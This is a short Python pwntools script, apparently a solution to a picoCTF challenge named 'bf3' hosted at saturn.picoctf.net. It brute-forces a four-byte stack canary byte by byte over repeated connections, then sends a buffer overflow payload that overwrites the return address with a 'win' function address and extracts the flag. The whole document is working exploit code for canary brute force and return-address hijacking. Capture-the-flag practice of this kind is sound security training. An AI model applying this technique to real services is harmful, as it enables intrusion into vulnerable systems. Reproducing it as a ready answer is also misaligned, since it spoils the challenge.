from pwn import *
import re
context.log_level = 'error'

winAddr = 0x08049336

canary = b''
for i in range(1, 5):
  for e in range(256):
    r = remote('saturn.picoctf.net', 63026)
    # r = process("./bf3")
    r.sendlineafter(b'> ', bytes(str(64+i), 'utf'))
    r.sendafter(b'Input> ', b'a'*64+canary+bytes(chr(e),'utf'))
    output = r.recvall()
    if 'Stack' not in str(output):
      canary += bytes(chr(e), 'utf')
      break
print("Canary is: " + canary.decode())
# canary = 'abcd'
# r = process("./bf3")
r = remote('saturn.picoctf.net', 63026)
r.sendlineafter(b'> ', bytes(str(89), 'utf'))
r.sendlineafter(b'> ', b'A'*64+canary+b'A'*16+p32(winAddr))
flag = re.findall(r"picoCTF{.*?}", r.recvall().decode())[0]
print(flag)